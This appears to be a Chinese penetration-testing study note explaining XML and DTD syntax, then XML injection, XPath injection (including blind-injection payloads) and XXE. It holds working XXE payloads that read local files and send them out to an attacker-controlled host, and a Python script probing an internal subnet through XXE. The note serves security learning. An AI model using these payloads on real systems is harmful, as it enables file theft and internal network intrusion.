---
title: XML
date: 2023-09-03T15:29:52+08:00
updated: 2023-05-27T18:48:14+08:00
categories: 
- 渗透测试
- 外网漏洞
---

## 简介

```
XML外部实体攻击是一种针对解析XML格式应用程序的攻击类型之一。此类攻击发生在配置不当的XML解析器处理指向外部实体的文档时，可能会导致敏感文件泄露、拒绝服务攻击、服务器端请求伪造、端口扫描（解析器所在域）和其他系统影响
```

## 基本语法与基本格式

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><!--xml文件的声明-->
<bookstore>                                                 <!--根元素-->
<book category="COOKING">        <!--bookstore的子元素，category为属性-->
<title>Everyday Italian</title>           <!--book的子元素，lang为属性-->
<author>Giada De Laurentiis</author>                  <!--book的子元素-->
</book>                                                 <!--book的结束-->
</bookstore>                                       <!--bookstore的结束-->
```

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
xml文档的声明，用于声明xml文档的版本，编码，需要注意的是standalone的值，当为yes时表示DTD仅用于验证文档结构，从而禁用了外部实体，默认为no或是直接忽略；
```

## DTD

```
XML文件的文档类型定义（Document Type Definition）可以看成一个或者多个XML文件的模板，在这里可以定义XML文件中的元素、元素的属性、元素的排列方式、元素包含的内容等等。

DTD（Document Type Definition）概念缘于SGML，每一份SGML文件，均应有相对应的DTD。对XML文件而言，DTD并非特别需要，well-formed XML就不需要有DTD。DTD有四个组成如下：

元素（Elements）
属性（Attribute）
实体（Entities）
注释（Comments）
由于DTD限制较多，使用时较不方便，近来已渐被XML Schema所取代。
```

### DTD语法

```
XML用实体引用（entity reference）替换特殊字符。XML预定义五个实体引用，即用&lt; &gt; &amp; &apos; &quot; 替换 < > & ' " 。DTD就是为了自定义引用实体
```

```
元素声明语法如下：
<!ELEMENT 元素名稱　元素內容>
属性声明语法如下：
<!ATTLIST 元素名稱、屬性名稱、屬性值型態、屬性的內定值>
实体声明语法如下：
<!ENTITY 实体名稱　实体內容>
注释语法如下：
<!-- 註解內容 -->
```

**内部DTD**

直接在xml文档中声明，并且引用的DTD

```xml-dtd
<!DOCTYPE 根元素名称 [元素声明]>
eg:
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE note [ <!--定义此文档是 note 类型的文档-->
<!ELEMENT note (to,from,heading,body)><!--定义note元素有四个元素-->
<!ELEMENT to (#PCDATA)><!--定义to元素为”#PCDATA”类型-->
]>
```

**外部DTD**

1.引入外部dtd

```
<!DOCTYPE 根元素名称 SYSTEM "dtd路径">
```

2.引用来自网络上的dtd

```
<!DOCTYPE 根元素名称 PUBLIC 'dtd文件名称' 'dtd文档的url'>
```

示例代码

```dtd
<!DOCTYPE note SYSTEM 'test.dtd'>
```

test.dtd

```dtd
<!--直接进行元素的声明-->
<!ELEMENT to (#PCDATA)>
```

**PCDATA**
PCDATA的意思是被解析的字符数据。PCDATA是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。
被解析的字符数据不应当包含任何`&`，`<`，或者`>`字符，需要用`&` `<` `>`实体来分别替换。
**CDATA**
CDATA意思是字符数据，CDATA 是不会被解析器解析的文本，在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。

**DTD元素声明**

![dtd](C:\Users\86199\Pictures\dtd.png)

**DTD属性声明**

```
属性声明语法如下：
<!ATTLIST 元素名稱、屬性名稱、屬性值型態、屬性的內定值>
```

![dtd](E:\笔记软件\笔记\从零开始的web安全\dtd.png)

### DTD实体

实体是用于定义引用普通文本或特殊字符的快捷方式的变量。

- 实体引用是对实体的引用。
- 实体可在内部或外部进行声明。

**一般实体**

```dtd
<!ENTITY 实体名称 "实体内容"> <!--声明-->
&实体名称; <!--引用-->
```

普通实体可以在DTD中引用，可以在XML中引用，可以在声明前引用，还可以在实体声明内部引用。

**参数实体**

```dtd
<!ENTITY % 实体名称 "实体内容"><!--声明-->
%实体名称;<!--引用-->
```

参数实体只能在DTD中引用，不能在声明前引用，也不能在实体声明内部引用。
DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。

**内部实体**

声明

```
<!ENTITY entity-name "entity-value">
```

代码示例

```xml-dtd
DTD实体
<!ENTITY fumo "cute">
XML内容
<person>&fumo;</person>
```

**外部实体**

语法

```
<!ENTITY entity-name SYSTEM "URI/URL"> //来自本地系统
<!ENTITY 实体名称 PUBLIC "public_ID" "URI">  //来自网络
```

代码示例

```xml-dtd
DTD
<!ENTITY fumo PUBLIC "http://uu2fumo.com/fumo.dtd">
xml
<person>&fumo;</person>
```

## XML注入

通过闭合xml标签,修改xml文件实现

**前提条件**

1.用户能够控制参数

2.程序有拼凑的部分

3.能够获取xml表结构

示例代码

```xml
<?xml version="1.0" encoding="UTF-8"?>
<manager>
    <admin id='1'>
        <username>admin</username>
        <passwd>admin</passwd>
    </admin>
</manager>
```

假设用户输入数据被拼接进该xml文件中则，用户可以构造以下数据

```
admin </passwd></admin><admin id='2'><username>fumo</username><passwd>fumo</passwd></admin>
```

则修改后xml文件为

```xml
<?xml version="1.0" encoding="UTF-8"?>
<manager>
    <admin id='1'>
        <username>admin</username>
        <passwd>admin</passwd>
    </admin>
    ><admin id='2'><username>fumo</username><passwd>fumo</passwd></admin>
</manager>
```

完成注入

**防御xml注入**

为了防御该类修改xml表结构达成的注入，建议进行参数的过滤或是转义

## XPath注入

**Xpath简介**

```
XPath即为XML路径语言（XML Path Language），它是一种用来确定XML文档中某部分位置的计算机语言。

XPath基于XML的树状结构，提供在数据结构树中找寻节点的能力.
```

**Xpath攻击简介**

```
XPath注入攻击是指利用XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的XPath 查询代码，以获得权限信息的访问权并更改这些信息。XPath注入攻击是针对Web服务应用新的攻击方法，它允许攻击者在事先不知道XPath查询相关知识的情况下，通过XPath查询得到一个XML文档的完整内容。
```

[Xpath注入基础语法学习](https://www.freebuf.com/column/211251.html)

xpath注入和sql注入很相似，都是通过构造对应的语法进行利用，查询数据库等，并且xpath注入并没有sql注入一样的权限限制，能够获取到完整的xml表结构，注入出现的位置也就是`cookie`，`headers`，`request` `parameters/input`等。

**直接注入**

假设有如下存储用户名和密码1.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<manager>
    <admin>
        <id>1</id>
        <username>admin</username>
        <passwd>admin</passwd>
    </admin>
</manager>
```

有查询语句

```php
<?php
$xml=simplexml_load_file('1.xml');
$name=$_GET['name'];
$pwd=$_GET['pwd'];
$query="/manager/admin[username/text()='".$name."' and passwd/text()='".$pwd."']";
echo $query;
$result=$xml->xpath($query);
if($result){
    foreach($result as $key=>$value){
        echo '<br />ID:'.$value->id;
        echo '<br />Username:'.$value->username;
    }
}
?>
```

假设我们在name处输入

```
'or 1=1 ''='
```

则查询语句变为

```
/manager/admin[username/text()='' or 1=1 or ''='' and passwd/text()='1']
```

则用户可以获得所有的用户名和密码

**盲注**

xpath的盲注类似于sql的布尔盲注，没有错误回显的情况下，通过布尔来进行猜测,假设有如下xml结构

```xml
<?xml version="1.0" encoding="UTF-8"?>
<fumo>
    <user>
        <username>uu2</username>
        <password>uu2</password>
    </user>
</fumo>
```

基本顺序

1.判断根节点下的节点数

2.判断根节点下长度和名称

3.重复判断，猜解完所有节点

```xml
猜解根节点
'or count(/)=1  or ''=' <!--只有一个根节点-->
'or count(/*)=1 or ''=' <!--根节点下中有一个子节点-->
判断根节点下的节点长度
'or string-length(name(/*[1]))=4 or ''=' <!--返回true则长度为4-->
判断根节点下子节点的名称
'or substring(name(/*[1]), 1, 1)='f'  or ''='
'or substring(name(/*[1]), 1, 1)='u'  or ''='
.....
'or substring(name(/*[1]), 4, 1)='o'  or ''=' <!--最终得到名称fumo-->
猜解fumo下的子节点数量
'or count(/fumo/*)=1 or ''=' 有一个子节点
'or string-length(name(/fumo/*[1]))=4  or ''=' <!--长度为4-->
猜测名称
//user[position()=1]：这会读出XML文档中排在第一位的用户。这里的user是一种假设.
(//user[position()=1]/child::node()[position()=1])读取第一个用户的子节点，即username
通过substring,或是string-length即可查询长度，只需要修改position的长度即可
```

## XXE

**原理**

```
XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。
通常产生该漏洞的位置都是能够上传xml文件的位置，或者是能够传递外部实体；
解析xml在php库libxml，libxml>=2.9.0的版本中没有XXE漏洞。
simplexml_load_string()可以读取XML
```

**恶意读取任意文件**

```xml-dtd
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE roottag [
<!ENTITY % start "<![CDATA[">   
<!ENTITY % goodies SYSTEM "file:///d:/test.txt">  
<!ENTITY % end "]]>">  
<!ENTITY % dtd SYSTEM "http://ip/evil.dtd"> 
%dtd; ]> 

<roottag>&all;</roottag>
```

evil.dtd

```xml-dtd
<?xml version="1.0" encoding="UTF-8"?> 
<!ENTITY all "%start;%goodies;%end;">
```

读取目标系统下的文件，实体调用位于自己vps的evil.dtd,适用于有回显的文件读取

本地无回显得XXE可以回显到自己的vps上

```xml-dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///D:/test.txt">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://ip:7777?p=%file;'>">
```

```xml-dtd
<!DOCTYPE convert [ 
<!ENTITY % remote SYSTEM "http://ip/test.dtd">
%remote;%int;%send;
]>
```

**内网主机探测**

利用file协议，尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件

在bp上进行固定ip的端口遍历探测端口；

参考代码

```python
import requests
import base64

#Origtional XML that the server accepts
#<xml>
#    <stuff>user</stuff>
#</xml>


def build_xml(string):
    xml = """<?xml version="1.0" encoding="ISO-8859-1"?>"""
    xml = xml + "\r\n" + """<!DOCTYPE foo [ <!ELEMENT foo ANY >"""
    xml = xml + "\r\n" + """<!ENTITY xxe SYSTEM """ + '"' + string + '"' + """>]>"""
    xml = xml + "\r\n" + """<xml>"""
    xml = xml + "\r\n" + """    <stuff>&xxe;</stuff>"""
    xml = xml + "\r\n" + """</xml>"""
    send_xml(xml)

def send_xml(xml):
    headers = {'Content-Type': 'application/xml'}
    x = requests.post('http://vps/CUSTOM/NEW_XEE.php', data=xml, headers=headers, timeout=5).text
    coded_string = x.split(' ')[-2] # a little split to get only the base64 encoded value
    print coded_string
#   print base64.b64decode(coded_string)
for i in range(1, 255):
    try:
        i = str(i)
        ip = '10.0.0.' + i
        string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/'
        print string
        build_xml(string)
    except:
continue
```

## 参考链接

https://xz.aliyun.com/t/6887

https://www.runoob.com/dtd/dtd-attributes.html

https://zh.wikipedia.org/wiki/XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%94%BB%E5%87%BB

https://xz.aliyun.com/t/7791#toc-6

https://owasp.org/www-community/attacks/Blind_XPath_Injection